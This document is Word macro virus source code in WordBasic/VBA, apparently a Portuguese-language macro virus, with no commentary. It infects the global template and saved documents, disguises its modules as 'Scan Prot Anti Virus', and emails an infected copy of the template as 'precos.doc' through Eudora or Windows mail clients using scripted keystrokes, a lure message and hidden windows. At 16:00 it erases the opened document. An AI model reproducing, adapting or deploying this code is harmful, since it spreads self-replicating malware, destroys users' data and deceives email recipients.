   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ArquivoSalvarComo"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Scan Prot Anti Virus\r\n"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoSalvarComo.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)    'declara dialog do tipo ArquivoSalvarComo
   WordBasic.CurValues.FileSaveAs dlg
   dlg.Format = 1
   WordBasic.Dialog.FileSaveAs dlg      'executa o diálogo.
   On Error GoTo -1: On Error GoTo Erro
   'O documento é do tipo .doc ou .dot?
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
       'Faz com que salve o documento como um modelo.
       dlg.Format = 1
   On Error GoTo -1: On Error GoTo Feriados
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   Feriados:
   On Error GoTo -1: On Error GoTo autoclose
   WordBasic.MacroCopy "Global:Feriados", WordBasic.[WindowName$]() + ":Feriados", 1
   autoclose:
   On Error GoTo -1: On Error GoTo autoopen
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   autoopen:
   On Error GoTo -1: On Error GoTo arqsalcomo
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   arqsalcomo:
   On Error Goto -1 : On Error Goto WordBasic.ToolsMacro
   WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo", 1
   WordBasic.ToolsMacro:
   On Error GoTo -1: On Error GoTo espa
   WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro", 1
   espa:
   On Error GoTo -1: On Error GoTo carta
   WordBasic.MacroCopy "Global:Espa", WordBasic.[WindowName$]() + ":Espa", 1
   carta:
   On Error GoTo -1: On Error GoTo salvar
   WordBasic.MacroCopy "Global:carta", WordBasic.[WindowName$]() + ":carta", 1
   salvar:
   On Error GoTo -1: On Error GoTo OFF
   WordBasic.MacroCopy "Global:ArquivoSalvar", WordBasic.[WindowName$]() + ":ArquivoSalvar", 1
   End If
   OFF:
   WordBasic.FileSaveAs dlg  'salva o documento infectado.
   Erro:
   End Sub

   Attribute VB_Name = "ArquivoSalvar"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Salva o documento ativo ou modelo"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoSalvar.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)    'declara dialog do tipo ArquivoSalvarComo
   WordBasic.CurValues.FileSaveAs dlg
   dlg.Format = 1
   WordBasic.Dialog.FileSaveAs dlg      'executa o diálogo.
   On Error GoTo -1: On Error GoTo Erro
   'O documento é do tipo .doc ou .dot?
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
       'Faz com que salve o documento como um modelo.
       dlg.Format = 1
   On Error GoTo -1: On Error GoTo Feriados
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   Feriados:
   On Error GoTo -1: On Error GoTo autoclose
   WordBasic.MacroCopy "Global:Feriados", WordBasic.[WindowName$]() + ":Feriados", 1
   autoclose:
   On Error GoTo -1: On Error GoTo autoopen
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   autoopen:
   On Error GoTo -1: On Error GoTo salvarcomo
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   salvarcomo:
   On Error Goto -1 : On Error Goto WordBasic.ToolsMacro
   WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo", 1
   WordBasic.ToolsMacro:
   On Error GoTo -1: On Error GoTo espa
   WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro", 1
   espa:
   On Error GoTo -1: On Error GoTo carta
   WordBasic.MacroCopy "Global:Espa", WordBasic.[WindowName$]() + ":Espa", 1
   carta:
   On Error GoTo -1: On Error GoTo salvar
   WordBasic.MacroCopy "Global:carta", WordBasic.[WindowName$]() + ":carta", 1
   salvar:
   On Error GoTo -1: On Error GoTo OFF
   WordBasic.MacroCopy "Global:ArquivoSalvar", WordBasic.[WindowName$]() + ":ArquivoSalvar", 1
   End If
   OFF:
   WordBasic.FileSaveAs dlg  'salva o documento espado.
   Erro:

   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   WordBasic.Call "carta"
   WordBasic.Call "Feriados"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim caminho$
   WordBasic.Call "espa"
   caminho$ = Environ("OFF")
   If caminho$ = "OFF" Then GoTo feriado
   On Error GoTo -1: On Error GoTo OFF
   If WordBasic.Hour(WordBasic.Now()) = 16 Then
   WordBasic.EditSelectAll
   WordBasic.EditClear
   WordBasic.FileSave
   WordBasic.FileClose
       End If
   OFF:
   feriado:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Scan Prot Anti Virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   WordBasic.Call "Feriados"
   WordBasic.Call "Espa"
   End Sub

   Attribute VB_Name = "carta"

   Public Sub MAIN()
   Dim versao$
   Dim so$
   Dim normal$
   Dim nome$
   Dim T
   Dim tecla
   On Error GoTo -1: On Error GoTo OFF
   versao$ = WordBasic.[GetSystemInfo$](24)
   so$ = WordBasic.[GetSystemInfo$](21)
   normal$ = ""
   nome$ = "c:\precos.doc"
   If WordBasic.[Files$](nome$) <> "" Then WordBasic.Kill nome$
   If WordBasic.[Files$]("c:\winword\modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\winword\modelos\normal.dot")
   If WordBasic.[Files$]("c:\winword\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\winword\normal.dot")
   If WordBasic.[Files$]("c:\msoffice\modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\msoffice\modelos\normal.dot")
   If WordBasic.[Files$]("c:\msoffice\models\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("c:\msoffice\models\normal.dot")
   If WordBasic.[Files$]("normal.dot") <> "" Then normal$ = WordBasic.[Files$]("normal.dot")
   If WordBasic.[Files$]("modelos\normal.dot") <> "" Then normal$ = WordBasic.[Files$]("modelos\normal.dot")

   If normal$ = "" Then GoTo OFF
   WordBasic.CopyFile normal$, "c:\"
   WordBasic.Rename "c:\Normal.", nome$

   If WordBasic.AppIsRunning("Eudora") Then
       WordBasic.AppShow "Eudora Light"
       WordBasic.AppActivate "Eudora"
       GoTo eudora
   End If
   If WordBasic.AppIsRunning("Internet Mail") Then GoTo Win95
   If WordBasic.[Files$]("C:\eudora\eudora.exe") <> "" Then
   WordBasic.Shell WordBasic.[Files$]("C:\eudora\eudora.exe"), 1
   GoTo eudora
   End If

   If WordBasic.[Files$]("C:\arquivos de programas\eudora\eudora.exe") <> "" Then
   WordBasic.Shell WordBasic.[Files$]("C:\arquivos de programas\eudora\eudora.exe"), 1
   GoTo eudora
   End If
   If WordBasic.[Files$]("C:\Program Files\eudora\eudora.exe") <> "" Then
   WordBasic.Shell WordBasic.[Files$]("C:\Program Files\eudora\eudora.exe"), 1
   GoTo eudora
   End If

   If so$ = "Windows" Then GoTo Windows
   GoTo OFF
   Windows:
   If (versao$ >= "3") And (versao$ < "4.0") Then GoTo Win311
   If WordBasic.AppIsRunning("Internet Mail") Then GoTo Win95
   GoTo OFF
   Win311:
   If WordBasic.AppIsRunning("Mail") Then
       WordBasic.AppActivate "Mail"
   Else
   WordBasic.MicrosoftMail
   WordBasic.SendKeys "{enter 3}", -1
   End If
   On Error GoTo -1: On Error GoTo OFF
   WordBasic.SendKeys "^r", -1
   WordBasic.AppHide "Mensagem"
   WordBasic.SendKeys "%d", -1
   WordBasic.AppHide "Endereços"
   WordBasic.SendKeys "+^{end}", -1
   WordBasic.SendKeys "%p", -1
   WordBasic.SendKeys "{enter}", -1
   WordBasic.SendKeys "{tab 2}Sente só:{tab}", -1
   WordBasic.SendKeys " Oi,{enter 2}Estou te enviando uma lista ", -1
   WordBasic.SendKeys "sobre precos de programas para ", -1
   WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
   WordBasic.SendKeys "com voce mais tarde, eu tenho que ", -1
   WordBasic.SendKeys "ir para a escola, a empregada nao veio ", -1
   WordBasic.SendKeys "e eu tenho que me virar. Tchau.%r", -1
   WordBasic.SendKeys nome$, -1
   WordBasic.SendKeys "{enter}%f%n%j1", -1
   WordBasic.SendKeys "{home}+^{end}{del 2}%{f4}"
   WordBasic.SendKeys T = tecla "{tab}{enter}", - 1
   WordBasic.Kill nome$
   Win95:
   WordBasic.AppShow "Internet mail"
   WordBasic.AppHide "Internet mail"
   WordBasic.SendKeys "^n", -1
   If WordBasic.AppIsRunning("Nova Messagem") Then
       GoTo Portugues
   Else
       If WordBasic.AppIsRunning("New Message") Then GoTo Ingles
   End If
   GoTo OFF
   Ingles:
   WordBasic.AppHide "New message"
   WordBasic.SendKeys "%m", -1
   WordBasic.SendKeys "r+^{end}", -1
   WordBasic.SendKeys "%o", -1
   WordBasic.SendKeys "{tab 7}{enter}{tab 2}", -1
   WordBasic.SendKeys "^{home}Sente só:{tab}", -1
   WordBasic.SendKeys " ^{home}{enter}^{home}Oi,{enter 2}Estou", -1
   WordBasic.SendKeys " te enviando uma lista", -1
   WordBasic.SendKeys " sobre precos de programas e", -1
   WordBasic.SendKeys " jogos para o ", -1
   WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
   WordBasic.SendKeys "com voce mais tarde, eu tenho que", -1
   WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
   WordBasic.SendKeys "e eu tenho que me virar. Tchau.{enter}%if", -1
   WordBasic.AppHide "Insert Atta"
   WordBasic.SendKeys nome$, -1
   WordBasic.SendKeys "{enter}%s^m", -1
    WordBasic.SendKeys "{home}+^{end}{del}%{f4}^m", -1
   WordBasic.AppHide "Sending and Receiving"
   WordBasic.AppHide "Internet Mail"
   WordBasic.AppShow "Microsoft Word"
   GoTo OFF
   Portugues:
    WordBasic.AppActivate "Internet mail"
   WordBasic.AppHide "Internet mail"
    WordBasic.SendKeys "^n", -1
   WordBasic.AppHide "Nova mensagem"
   WordBasic.SendKeys "%m", -1
   WordBasic.SendKeys "r+^{end}", -1
   WordBasic.SendKeys "%p", -1
   WordBasic.SendKeys "{tab 7}{enter}{tab 2}", -1
   WordBasic.SendKeys "Sente só:{tab}", -1
   WordBasic.SendKeys " ^{home}{enter}^{home}Oi,{enter 2}Estou", -1
   WordBasic.SendKeys " te enviando uma lista", -1
   WordBasic.SendKeys " sobre precos de programas e", -1
   WordBasic.SendKeys " jogos para o ", -1
   WordBasic.SendKeys "PC, de uma olhada nela, falo ", -1
   WordBasic.SendKeys "com voce mais tarde, eu tenho que", -1
   WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
   WordBasic.SendKeys "e eu tenho que me virar. Tchau.{enter}%ia", -1
   WordBasic.AppHide "Insira"
   WordBasic.SendKeys nome$, -1
   WordBasic.SendKeys "{enter}%e^m", -1
    WordBasic.SendKeys "{home}+^{end}{del}%{f4}^m", -1
   WordBasic.AppHide "Interner mail"
   WordBasic.AppShow "Microsoft Word"
   GoTo OFF
   eudora:
   WordBasic.AppHide "Eudora Light"
   WordBasic.SendKeys "{esc 2}", -1
   WordBasic.SendKeys "^n^l{home}+^{end}%t", -1
   WordBasic.SendKeys "{tab}Sente só:{tab 3}", -1
   WordBasic.SendKeys "Oi,{enter 2}Estou te enviando uma lista", -1
   WordBasic.SendKeys " sobre preços de programas e", -1
   WordBasic.SendKeys " jogos para o ", -1
   WordBasic.SendKeys "PC, dê uma olhada nela, falo ", -1
   WordBasic.SendKeys "com voce outra hora, eu tenho que", -1
   WordBasic.SendKeys " ir para a escola, a empregada nao veio ", -1
   WordBasic.SendKeys "e eu tive que me virar sozinho. Tchau.{enter}^h", -1
   WordBasic.AppHide "Attach"
   WordBasic.SendKeys nome$, -1
   WordBasic.SendKeys "{enter}^e^t", -1
   WordBasic.AppHide "progress"
   WordBasic.AppHide "eudora Light"
    WordBasic.SendKeys "{enter}", -1
   WordBasic.AppShow "Microsoft Word"
   OFF:
   End Sub

   Attribute VB_Name = "espa"

   Public Sub MAIN()
   Dim caminho$
   caminho$ = Environ("OFF")
   If caminho$ = "OFF" Then GoTo OFF
   On Error GoTo -1: On Error GoTo OFF
   On Error GoTo -1: On Error GoTo autoexec
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Espa", "Global:Espa", 1
   autoexec:
   On Error GoTo -1: On Error GoTo carta
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
   carta:
   On Error GoTo -1: On Error GoTo space_
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":carta", "Global:carta", 1
   space_:
   On Error GoTo -1: On Error GoTo autoclose
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":space", "Global:space", 1
   autoclose:
   On Error GoTo -1: On Error GoTo autoopen
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
   autoopen:
   On Error GoTo -1: On Error GoTo arqsalcomo
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
   arqsalcomo:
   On Error GoTo -1: On Error GoTo Feriados
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvarComo", "Global:ArquivoSalvarComo", 1
   Feriados:
   On Error GoTo -1: On Error GoTo salvar
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":Feriados", "Global:Feriados", 1
   salvar:
   On Error GoTo -1: On Error GoTo OFF
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvar", "Global:ArquivoSalvar", 1
   OFF:
   End Sub
